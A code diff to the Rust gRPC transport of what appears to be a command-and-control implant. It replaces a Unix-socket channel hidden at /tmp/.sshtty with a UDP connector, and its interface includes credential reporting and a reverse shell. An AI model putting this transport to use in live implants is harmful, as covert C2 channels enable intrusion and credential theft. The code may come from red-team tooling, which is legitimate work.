@@ -10,12 +10,16 @@ use tonic::codec::ProstCodec;
 use tonic::GrpcMethod;
 use tonic::IntoRequest;
 use tonic::Request;
+use std::net::SocketAddr;
+use tower::Service;
+mod udpconnector;
+use udpconnector::UdpConnector;
 
-#[cfg(unix)]
-use tokio::net::UnixStream;
+
 use tonic::transport::{Channel, Endpoint, Uri};
 use tower::service_fn;
 use tokio::time::{sleep, Duration};
+
 static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
 static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
 static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
@@ -29,59 +33,8 @@ pub struct GRPC {
     grpc: tonic::client::Grpc<tonic::transport::Channel>,
 }
 
-// For non-Unix platforms, panic or provide a no-op implementation
-#[cfg(not(unix))]
-impl Transport for GRPC {
-    fn new(_callback: String, _proxy_uri: Option<String>) -> Result<Self> {
-        panic!("The UDS example only works on Unix systems!");
-    }
 
-    // Implement the rest as panics
-    async fn claim_tasks(&mut self, _request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
-        panic!("Not supported on non-Unix systems.")
-    }
-    async fn fetch_asset(
-        &mut self,
-        _request: FetchAssetRequest,
-        _tx: Sender<FetchAssetResponse>,
-    ) -> Result<()> {
-        panic!("Not supported on non-Unix systems.")
-    }
-    async fn report_credential(
-        &mut self,
-        _request: ReportCredentialRequest,
-    ) -> Result<ReportCredentialResponse> {
-        panic!("Not supported on non-Unix systems.")
-    }
-    async fn report_file(
-        &mut self,
-        _request: Receiver<ReportFileRequest>,
-    ) -> Result<ReportFileResponse> {
-        panic!("Not supported on non-Unix systems.")
-    }
-    async fn report_process_list(
-        &mut self,
-        _request: ReportProcessListRequest,
-    ) -> Result<ReportProcessListResponse> {
-        panic!("Not supported on non-Unix systems.")
-    }
-    async fn report_task_output(
-        &mut self,
-        _request: ReportTaskOutputRequest,
-    ) -> Result<ReportTaskOutputResponse> {
-        panic!("Not supported on non-Unix systems.")
-    }
-    async fn reverse_shell(
-        &mut self,
-        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        panic!("Not supported on non-Unix systems.")
-    }
-}
 
-// On Unix, we connect over a UDS defined at /tmp/.sshtty
-#[cfg(unix)]
 
 impl Transport for GRPC {
     fn new(callback: String, proxy_uri: Option<String>) -> Result<Self> {
@@ -91,16 +44,19 @@ impl Transport for GRPC {
             let rt = tokio::runtime::Runtime::new().expect("Failed to create Tokio Runtime");
 
             let connection: Result<tonic::client::Grpc<Channel>, anyhow::Error> = rt.block_on(async {
-                let endpoint = Endpoint::try_from("http://127.0.0.1:50051/grpc")
-                    .map_err(|e| anyhow!("Invalid endpoint URI: {}", e))?;
-
-                let channel = endpoint
-                    .connect_with_connector_lazy(service_fn(|_: Uri| async {
-                        let path = "/tmp/.sshtty"; // Replace with the actual UDS path
-                        UnixStream::connect(path)
-                            .await
-                            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
-                    }));
+                let local_addr: SocketAddr = "0.0.0.0:0".parse().unwrap();
+                let remote_addr: SocketAddr = "127.0.0.1:54321".parse().unwrap();
+            
+                // Initialize the UDP connector.
+                let udp_connector = UdpConnector::new(local_addr, remote_addr);
+            
+                // Use the UDP connector to create a tonic channel.
+                let channel = Endpoint::try_from("http://[::]:50051")?
+                    .connect_with_connector(service_fn(move |uri| {
+                        let mut connector = udp_connector.clone();
+                        async move { connector.call(uri).await }
+                    }))
+                    .await?;
 
                 Ok(tonic::client::Grpc::new(channel))
             });
